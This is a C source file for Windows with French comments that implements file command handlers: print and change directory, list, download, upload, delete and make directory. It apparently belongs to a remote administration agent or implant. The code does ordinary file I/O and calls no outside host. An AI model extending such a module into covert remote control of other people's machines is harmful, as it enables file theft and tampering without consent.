/*
 * file.c - Opérations fichiers
 */

#include "file.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"

int handler_file_pwd(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char *buffer = (char *)malloc(MAX_PATH_LEN);
  if (!buffer) {
    return STATUS_NO_MEMORY;
  }

  DWORD result = GetCurrentDirectoryA(MAX_PATH_LEN, buffer);
  if (result == 0 || result > MAX_PATH_LEN) {
    free(buffer);
    return STATUS_FAILURE;
  }

  *output = buffer;
  *len = strlen(buffer);

  return STATUS_SUCCESS;
}

int handler_file_cd(const char *path, char **output, size_t *len) {
  if (!path || !output || !len) {
    return STATUS_FAILURE;
  }

  if (SetCurrentDirectoryA(path)) {
    /* Retourne le nouveau répertoire courant */
    return handler_file_pwd(output, len);
  } else {
    *output = str_dup("Failed to change directory");
    *len = *output ? strlen(*output) : 0;
    return STATUS_FAILURE;
  }
}

int handler_file_ls(const char *path, char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char search_path[MAX_PATH_LEN];
  if (path && strlen(path) > 0) {
    snprintf(search_path, sizeof(search_path), "%s\\*", path);
  } else {
    snprintf(search_path, sizeof(search_path), ".\\*");
  }

  WIN32_FIND_DATAA find_data;
  HANDLE find_handle = FindFirstFileA(search_path, &find_data);

  if (find_handle == INVALID_HANDLE_VALUE) {
    *output = str_dup("Failed to list directory");
    *len = *output ? strlen(*output) : 0;
    return STATUS_FAILURE;
  }

  /* Construit la liste */
  char *buffer = NULL;
  size_t buffer_size = 0;
  size_t buffer_used = 0;

  do {
    /* Skip . et .. */
    if (strcmp(find_data.cFileName, ".") == 0 ||
        strcmp(find_data.cFileName, "..") == 0) {
      continue;
    }

    /* Format: type size name */
    char line[512];
    const char *type =
        (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "d" : "-";

    ULARGE_INTEGER file_size;
    file_size.HighPart = find_data.nFileSizeHigh;
    file_size.LowPart = find_data.nFileSizeLow;

    snprintf(line, sizeof(line), "%s %12llu %s\n", type, file_size.QuadPart,
             find_data.cFileName);

    size_t line_len = strlen(line);

    /* Réalloue si nécessaire */
    if (buffer_used + line_len + 1 > buffer_size) {
      buffer_size = buffer_size == 0 ? 4096 : buffer_size * 2;
      char *new_buffer = (char *)realloc(buffer, buffer_size);
      if (!new_buffer) {
        free(buffer);
        FindClose(find_handle);
        return STATUS_NO_MEMORY;
      }
      buffer = new_buffer;
    }

    memcpy(buffer + buffer_used, line, line_len);
    buffer_used += line_len;

  } while (FindNextFileA(find_handle, &find_data));

  FindClose(find_handle);

  if (buffer) {
    buffer[buffer_used] = '\0';
  } else {
    buffer = str_dup("(empty directory)");
    buffer_used = buffer ? strlen(buffer) : 0;
  }

  *output = buffer;
  *len = buffer_used;

  return STATUS_SUCCESS;
}

int handler_file_download(const char *path, uint8_t **data, size_t *len) {
  if (!path || !data || !len) {
    return STATUS_FAILURE;
  }

  *data = NULL;
  *len = 0;

  /* Ouvre le fichier */
  HANDLE file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

  if (file == INVALID_HANDLE_VALUE) {
    return STATUS_FAILURE;
  }

  /* Récupère la taille */
  LARGE_INTEGER file_size;
  if (!GetFileSizeEx(file, &file_size)) {
    CloseHandle(file);
    return STATUS_FAILURE;
  }

  /* Limite à 50 MB pour éviter les problèmes */
  if (file_size.QuadPart > 50 * 1024 * 1024) {
    CloseHandle(file);
    return STATUS_FAILURE;
  }

  /* Alloue le buffer */
  uint8_t *buffer = (uint8_t *)malloc((size_t)file_size.QuadPart);
  if (!buffer) {
    CloseHandle(file);
    return STATUS_NO_MEMORY;
  }

  /* Lit le fichier */
  DWORD bytes_read;
  if (!ReadFile(file, buffer, (DWORD)file_size.QuadPart, &bytes_read, NULL)) {
    free(buffer);
    CloseHandle(file);
    return STATUS_FAILURE;
  }

  CloseHandle(file);

  *data = buffer;
  *len = bytes_read;

  return STATUS_SUCCESS;
}

int handler_file_upload(const char *path, const uint8_t *data, size_t len) {
  if (!path || !data || len == 0) {
    return STATUS_FAILURE;
  }

  /* Crée/écrase le fichier */
  HANDLE file = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL, NULL);

  if (file == INVALID_HANDLE_VALUE) {
    return STATUS_FAILURE;
  }

  /* Écrit les données */
  DWORD bytes_written;
  BOOL success = WriteFile(file, data, (DWORD)len, &bytes_written, NULL);

  CloseHandle(file);

  return success ? STATUS_SUCCESS : STATUS_FAILURE;
}

int handler_file_rm(const char *path) {
  if (!path) {
    return STATUS_FAILURE;
  }

  return DeleteFileA(path) ? STATUS_SUCCESS : STATUS_FAILURE;
}

int handler_file_mkdir(const char *path) {
  if (!path) {
    return STATUS_FAILURE;
  }

  return CreateDirectoryA(path, NULL) ? STATUS_SUCCESS : STATUS_FAILURE;
}
